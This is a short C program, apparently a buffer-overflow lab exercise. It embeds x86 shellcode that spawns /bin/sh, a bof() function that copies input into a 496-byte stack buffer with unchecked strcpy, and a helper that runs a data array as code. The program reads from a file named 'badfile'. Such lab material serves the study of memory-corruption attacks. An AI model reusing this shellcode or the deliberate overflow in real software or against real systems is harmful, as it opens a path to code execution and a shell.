#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// 496 1612


char code[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"             /* int     $0x80                  */
;

int bof(char *str){
    char buffer[496];	
    strcpy(buffer, str);
    return 1;
}

int execute(char* m_code){
   ((void(*)( ))m_code)( );
}

char* foo(){
    printf("Inside Foo\n");
    // execute(code);
    return code;
}

int bar(int x){
    printf("Input Parameter %d\n",x);
    return x+1;
}

int main(int argc, char **argv){
    char str[1612 + 1];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    printf("Inside Main\n");
    fread(str, sizeof(char), 1612, badfile);
    foo();
    printf("Returned Properly\n");
    return 1;
}